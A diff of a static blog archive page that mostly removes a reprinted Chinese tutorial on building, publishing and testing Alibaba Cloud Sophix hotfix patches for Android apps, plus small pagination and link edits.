-<p><code>Sophix何时走即时生效热修复，何时走冷启动修复？</code><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907">https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907</a></p>
-<p><code>配置完成后点击Go开始打差量包</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/14.png" alt="image"></p>
-<p><code>成功</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/15.png" alt="image"></p>
-<p><code>sophix-patch.jar 就是打出的差量包</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/16.png" alt="image"></p>
-</blockquote>
-<h2><span id="四-上传补丁-发布">四、上传补丁-发布</span></h2><h3><span id="41-添加你的应用版本然后上传补丁">4.1、添加你的应用版本，然后上传补丁</span></h3><blockquote>
-<p><img src="/2024/01/15/Aliyun-Sophix/17.png" alt="image"></p>
-</blockquote>
-<h3><span id="42-发布补丁">4.2、发布补丁</span></h3><blockquote>
-<p><code>上传后点击发布如下图</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/18.png" alt="image"></p>
-<p><code>下载[hotfixdebug]工具验证你的补丁包是否成功</code>,调试流程原文如下链接：</p>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434866.html">https://help.aliyun.com/document_detail/434866.html</a></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/19.png" alt="image"></p>
-<p>调试没问题后点击上图的<code>新建发布</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/20.png" alt="image"></p>
-<p>发布的话：有全量，灰度两种，<code>灰度的话</code> ，需要设置指定标签<code>tag</code>，就是你的应用app中Sophix所配置的，如下图：（推荐是全量）</p>
-<p><img src="/2024/01/15/Aliyun-Sophix/21.png" alt="image"></p>
-</blockquote>
-<h3><span id="43-发布成功后在app中调用查询补丁方法">4.3、发布成功后在app中调用查询补丁方法</span></h3><blockquote>
-<h3><span id="sophixmanagergetinstancequeryandloadnewpatch"><code>SophixManager.getInstance().queryAndLoadNewPatch()</code></span></h3><p>后续将回调<code>PatchLoadStatusListener</code>如下图</p>
-<p><img src="/2024/01/15/Aliyun-Sophix/22.png" alt="image"></p>
-<p>依次出现热修状态码如下，状态码含义：</p>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA">https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA</a></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/23.png" alt="image"></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/24.png" alt="image"></p>
-<p><strong>上图加载成功后提示需要重启后热修生效</strong></p>
-</blockquote>
-<h2><span id="五-测试用例">五、测试用例</span></h2><blockquote>
-<p><strong>1.</strong> 修改一个toast文案，然后修复成功。</p>
-<p><strong>2.</strong> 修改一张图片，增加一张新的图片进行展示，增加点击效果，增加一个新的类生成提示文案（mipmap-hdpi、drawable-xhdpi、drawable、都添加图片）</p>
-<p>drawable-xhdpi 中新增热修图片添加可能会存在问题：如下，然后按要求在drawable 中添加后，热修成功。</p>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/338384.html">https://help.aliyun.com/document_detail/338384.html</a></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/25.png" alt="image"></p>
-<p><strong>3.</strong> 添加assets文件，热修成功。 </p>
-<p><strong>4.</strong> <code>四大组件不行</code>，因为需要在AndroidManifest.xml文件中配置，热修的时候使用的话会报找不到的，需要注册异常，如下图</p>
-<p><img src="/2024/01/15/Aliyun-Sophix/26.png" alt="image"></p>
-<p><strong>5.</strong> 删除测试4中的组件跳转流程，热修测试成功，</p>
-<p><strong>6.</strong> 删除测试2中添加的xml中的代码与相关资源，热修测试成功</p>
-<p>注意：</p>
-<p> 1.热修包存在的话，每杀死app，初始化进来都会走</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onLoad方法的回调</span><br><span class="line"></span><br><span class="line"><span class="attr">code</span> == PatchStatus.CODE_LOAD_SUCCESS</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/15/Aliyun-Sophix/27.png" alt="image"></p>
-<p>2.同一个热修包，设置不同的tag，然后点击下发的话都会下发一次</p>
-<p>3.清除热修包后，之前发布的版本都无效了，再次查询加载，都查不到了，只能之后在这个版本重新发布</p>
-<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SophixManager<span class="selector-class">.getInstance</span>()<span class="selector-class">.cleanPatches</span>()</span><br></pre></td></tr></table></figure>
-
-<p>热修复书籍：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/115122">https://developer.aliyun.com/article/115122</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Sophix/" rel="tag">Sophix</a>
-            </div>
-        
-
-    </section>
-</article>
-  
 </section>
 
 
@@ -905,6 +979,11 @@
       <span class="text">Previous</span>
     </a>
     
+    
+    <a class="next" rel="next" href="/archives/2024/page/4/">
+      <span class="text">Next</span>
+      <span class="icon icon-chevron-right"></span>
+    </a>
     
   </nav>
 
@@ -919,7 +998,7 @@
     <div class="social-wrapper">
         
             
-                <a href="https://github.com/artchen" class="social github"
+                <a href="https://github.com/szczecin" class="social github"
                    target="_blank" rel="external">
                     <span class="icon icon-github"></span>
                 </a>
@@ -1038,7 +1117,7 @@
                     </li>
                 
                     <li class="left">
-                        <a href="/SRC"
+                        <a href="/tags/SRC"
                            onfocus="this.blur();"
                            class="nav-SRC dark-btn block">
                             SRC
